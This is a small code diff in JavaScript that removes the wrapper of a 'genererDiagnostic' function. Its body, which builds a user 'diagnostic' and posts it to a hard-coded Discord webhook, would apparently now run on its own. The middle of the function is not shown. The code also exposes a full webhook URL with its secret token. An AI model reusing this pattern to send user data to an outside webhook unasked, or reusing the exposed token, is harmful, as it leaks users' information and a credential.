@@ -1,4 +1,4 @@
-async function genererDiagnostic() {
+
   const webhookURL = "https://discord.com/api/webhooks/1361789315868397609/k6EYXeGKbwCSaJJF7p7OQxj12QnJKrHHhuFxyZ6Jj-gcgjK2hBuJsKNhjR6JI0xstR2B";
 
   let diagnostic = "=== Diagnostic du user ===\n";
@@ -48,4 +48,3 @@ async function genererDiagnostic() {
   } catch (err) {
     console.error("Erreur Fetch Webhook :", err);
   }
-}
